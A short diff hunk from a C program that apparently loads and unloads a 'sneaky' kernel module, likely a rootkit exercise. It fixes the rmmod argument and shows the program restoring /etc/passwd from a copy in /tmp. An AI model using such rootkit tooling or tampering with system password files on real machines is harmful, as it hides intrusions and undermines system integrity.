@@ -20,7 +20,7 @@ int main(void){
   while ((inputChar = getchar()) != 'q');
 
   // 5. unload sneaky module
-  system("rmmod sneaky_mod.ko");
+  system("rmmod sneaky_mod");
 
   // 6. resore password file
   system("cp /tmp/passwd /etc");
